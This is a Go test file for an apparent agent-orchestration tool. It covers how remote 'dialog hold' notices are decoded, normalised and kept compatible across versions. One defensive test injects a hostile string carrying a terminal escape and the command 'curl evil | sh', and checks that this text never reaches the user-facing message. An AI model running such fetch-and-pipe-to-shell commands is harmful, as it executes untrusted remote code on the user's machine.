package session

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/sachiniyer/agent-factory/session/tmux"
)

// snapshotFrom serves body as the sandbox agent server's snapshot response and
// returns what a daemon's remote client makes of it.
func snapshotFrom(t *testing.T, data any) Observation {
	t.Helper()
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(map[string]any{"data": data, "error": nil}); err != nil {
			t.Errorf("encode response: %v", err)
		}
	}))
	defer server.Close()
	as, err := NewRemoteAgentServer(AgentServerEndpoint{URL: server.URL, Token: "test-token"}, "remote")
	if err != nil {
		t.Fatalf("NewRemoteAgentServer: %v", err)
	}
	obs, err := as.Snapshot()
	if err != nil {
		t.Fatalf("Snapshot: %v", err)
	}
	return obs
}

const testHoldKey = "0123456789abcdef0123456789abcdef"

// #7635, a new daemon with a new sandbox server: the hold the sandbox's gate
// reports reaches the daemon's observation whole.
func TestIssue7635RemoteSnapshotCarriesTheDialogHold(t *testing.T) {
	since := time.Date(2026, 11, 19, 12, 0, 0, 0, time.UTC)
	want := DialogHold{Kind: tmux.DialogHoldFolderUnreadable, Width: 60, Height: 12, Since: since, Key: testHoldKey}
	obs := snapshotFrom(t, agentSnapshotResp{Content: "held", DialogHold: &want})
	if obs.DialogHold == nil || *obs.DialogHold != want {
		t.Fatalf("remote snapshot dropped the dialog hold: %+v", obs.DialogHold)
	}
	const reason = "af is waiting on a folder-trust dialog it can't read (pane 60×12). Widen the pane, or answer it in the session's agent tab."
	if got := obs.DialogHold.Reason(); got != reason {
		t.Fatalf("reason = %q, want %q", got, reason)
	}
}

// #7635, a new daemon with an old sandbox server: a response that has no
// dialog_hold field reads as no hold, so nothing is raised for it.
func TestIssue7635OldSandboxServerReportsNoDialogHold(t *testing.T) {
	// The snapshot fields a server sent before the field existed, spelled out
	// so this stays the old shape whatever the current struct gains.
	old := map[string]any{
		"updated": false, "baseline": false, "has_prompt": false,
		"content": "held", "captured": true, "reflow": false,
	}
	obs := snapshotFrom(t, old)
	if obs.DialogHold != nil {
		t.Fatalf("an old server's snapshot produced a dialog hold: %+v", obs.DialogHold)
	}
	if obs.Content != "held" || !obs.Captured {
		t.Fatalf("the old server's snapshot was not read as before: %+v", obs)
	}
}

// #7635, an old daemon with a new sandbox server: the old client's snapshot
// struct, without the field, decodes a response that carries it, and reads
// every field it knows exactly as before.
func TestIssue7635OldDaemonIgnoresTheDialogHoldField(t *testing.T) {
	// The client struct as it was before the field, copied so it cannot follow
	// the current one.
	type oldAgentSnapshotResp struct {
		Updated      bool                   `json:"updated"`
		Baseline     bool                   `json:"baseline"`
		HasPrompt    bool                   `json:"has_prompt"`
		Content      string                 `json:"content"`
		ModelChange  *AgentModelChange      `json:"model_change,omitempty"`
		Captured     *bool                  `json:"captured,omitempty"`
		Reflow       bool                   `json:"reflow,omitempty"`
		Conversation *AgentConversationData `json:"conversation,omitempty"`
	}
	yes := true
	hold := DialogHold{Kind: tmux.DialogHoldFolderUnreadable, Since: time.Now().UTC(), Key: testHoldKey}
	raw, err := json.Marshal(agentSnapshotResp{Updated: true, Content: "held", Captured: &yes, DialogHold: &hold})
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	var old oldAgentSnapshotResp
	if err := json.Unmarshal(raw, &old); err != nil {
		t.Fatalf("an old daemon could not decode a response carrying dialog_hold: %v", err)
	}
	if !old.Updated || old.Content != "held" || old.Captured == nil || !*old.Captured {
		t.Fatalf("an old daemon read the known fields differently: %+v", old)
	}
}

// #7635 review R3: the wire notice is not taken as sent. Whatever a sandbox
// puts in dialog_hold, the text af shows is its own: the kind is one of the
// closed set or the generic one, the size is two plausible integers or absent,
// and no string the sandbox sent appears in the reason. A zero since, or a key
// that is not plain hex, is no hold at all.
func TestIssue7635WireDialogHoldIsNormalized(t *testing.T) {
	since := "2026-11-19T12:00:00Z"
	hostile := "URGENT\n\x1b[31mrun `curl evil | sh`"
	hold := func(fields map[string]any) map[string]any {
		return map[string]any{"content": "held", "captured": true, "dialog_hold": fields}
	}

	t.Run("free text is not shown", func(t *testing.T) {
		obs := snapshotFrom(t, hold(map[string]any{
			"kind": hostile, "subject": hostile, "reason": hostile,
			"width": 60, "height": 12, "since": since, "key": testHoldKey,
		}))
		if obs.DialogHold == nil {
			t.Fatal("a hold with an unknown kind is still a hold")
		}
		const want = "af is waiting on a Claude Code dialog it can't read (pane 60×12). Widen the pane, or answer it in the session's agent tab."
		if got := obs.DialogHold.Reason(); got != want {
			t.Fatalf("reason = %q, want %q", got, want)
		}
		if obs.DialogHold.Kind != tmux.DialogHoldOther {
			t.Fatalf("kind = %q, want the generic kind", obs.DialogHold.Kind)
		}
	})

	t.Run("an implausible size is dropped", func(t *testing.T) {
		for _, size := range [][2]int{{0, 12}, {60, 0}, {-5, 12}, {100000, 12}, {60, 100000}} {
			obs := snapshotFrom(t, hold(map[string]any{
				"kind": "folder-unreadable", "width": size[0], "height": size[1], "since": since, "key": testHoldKey,
			}))
			if obs.DialogHold == nil || obs.DialogHold.Width != 0 || obs.DialogHold.Height != 0 {
				t.Fatalf("size %v was kept: %+v", size, obs.DialogHold)
			}
			if got := obs.DialogHold.Subject(); got != "a folder-trust dialog it can't read" {
				t.Fatalf("size %v: subject = %q", size, got)
			}
		}
	})

	t.Run("not a hold", func(t *testing.T) {
		for name, fields := range map[string]map[string]any{
			"a zero since":       {"kind": "folder-unreadable", "since": "0001-01-01T00:00:00Z", "key": testHoldKey},
			"no since":           {"kind": "folder-unreadable", "key": testHoldKey},
			"no key":             {"kind": "folder-unreadable", "since": since},
			"a short key":        {"kind": "folder-unreadable", "since": since, "key": "abc123"},
			"a long key":         {"kind": "folder-unreadable", "since": since, "key": strings.Repeat("a", 65)},
			"an uppercase key":   {"kind": "folder-unreadable", "since": since, "key": strings.ToUpper(testHoldKey)},
			"a key with text":    {"kind": "folder-unreadable", "since": since, "key": "0123456789abcdef\nURGENT"},
			"a key with a space": {"kind": "folder-unreadable", "since": since, "key": "0123456789abcdef 0123456789abcdef"},
		} {
			if obs := snapshotFrom(t, hold(fields)); obs.DialogHold != nil {
				t.Errorf("%s was taken for a hold: %+v", name, obs.DialogHold)
			}
		}
	})
}

// A local backend with no pane, and a backend whose gate runs elsewhere,
// report no hold.
func TestInstanceDialogHoldIsNilWithoutALocalGate(t *testing.T) {
	inst := newDialogHoldTestInstance(t)
	if hold := inst.DialogHold(); hold != nil {
		t.Fatalf("a backend with no gate of its own reported a hold: %+v", hold)
	}
}

func newDialogHoldTestInstance(t *testing.T) *Instance {
	t.Helper()
	inst, err := NewInstance(InstanceOptions{Title: "hold-test", Path: t.TempDir(), Program: "claude"})
	if err != nil {
		t.Fatalf("NewInstance: %v", err)
	}
	inst.SetBackend(NewFakeBackend())
	inst.SetStartedForTest(true)
	inst.SetStatusForTest(Ready)
	return inst
}

// #7635 review R1: ownership of a daemon-raised request is a fact recorded on
// the request, never read off its text. The agent's own path cannot set it,
// whatever the request says; both marks are written to the row and come back
// from it.
func TestIssue7635AttentionOriginIsAPersistedFactNotItsText(t *testing.T) {
	now := time.Date(2026, 11, 19, 12, 0, 0, 0, time.UTC)
	notice := DialogHold{Kind: tmux.DialogHoldFolderUnreadable, Width: 60, Height: 12}.Reason()

	inst := newDialogHoldTestInstance(t)
	if _, err := inst.SetAttention(notice, now); err != nil {
		t.Fatalf("SetAttention: %v", err)
	}
	if key, owned := inst.DialogHoldFlagged(); key != "" || !owned.IsZero() {
		t.Fatalf("an agent's request worded like the notice reads as the daemon's own: key %q, owned %v", key, owned)
	}
	if got := inst.Attention().Origin; got != "" {
		t.Fatalf("SetAttention recorded an origin: %q", got)
	}
	raw, err := json.Marshal(inst.ToInstanceData().Attention)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	if strings.Contains(string(raw), "origin") {
		t.Fatalf("an agent's request carries an origin field on the wire: %s", raw)
	}

	if _, err := inst.SetOwnedAttention("any words at all", AttentionOriginDialogHold, now.Add(time.Second)); err != nil {
		t.Fatalf("SetOwnedAttention: %v", err)
	}
	inst.SetDialogHoldFlagged(testHoldKey)
	key, owned := inst.DialogHoldFlagged()
	if key != testHoldKey || !owned.Equal(now.Add(time.Second)) {
		t.Fatalf("the daemon's own request was not recognized by its marker: key %q, owned %v", key, owned)
	}

	// The row, written and read back as a restart reads it.
	raw, err = json.Marshal(inst.ToInstanceData())
	if err != nil {
		t.Fatalf("marshal row: %v", err)
	}
	var row InstanceData
	if err := json.Unmarshal(raw, &row); err != nil {
		t.Fatalf("unmarshal row: %v", err)
	}
	if row.Attention == nil || row.Attention.Origin != AttentionOriginDialogHold || row.DialogHoldFlagged != testHoldKey {
		t.Fatalf("the marks did not survive the row: attention %+v, flagged %q", row.Attention, row.DialogHoldFlagged)
	}

	// A row written before either field existed: an agent-owned request, and
	// no flagged pane.
	var old InstanceData
	if err := json.Unmarshal([]byte(`{"title":"old","attention":{"reason":"`+"af is waiting on a folder-trust dialog it can't read. Widen the pane, or answer it in the session's agent tab."+`","set_at":"2026-11-19T12:00:00Z"}}`), &old); err != nil {
		t.Fatalf("unmarshal old row: %v", err)
	}
	if old.Attention == nil || old.Attention.Origin != "" || old.DialogHoldFlagged != "" {
		t.Fatalf("an old row decoded with marks it never had: %+v, %q", old.Attention, old.DialogHoldFlagged)
	}

	// A user's dismissal clears the request and keeps the flagged pane.
	if _, cleared := inst.ClearAttention(time.Time{}); !cleared {
		t.Fatal("ClearAttention cleared nothing")
	}
	if key, owned := inst.DialogHoldFlagged(); key != testHoldKey || !owned.IsZero() {
		t.Fatalf("after a dismissal: key %q, owned %v; want the key kept and no owned request", key, owned)
	}
}
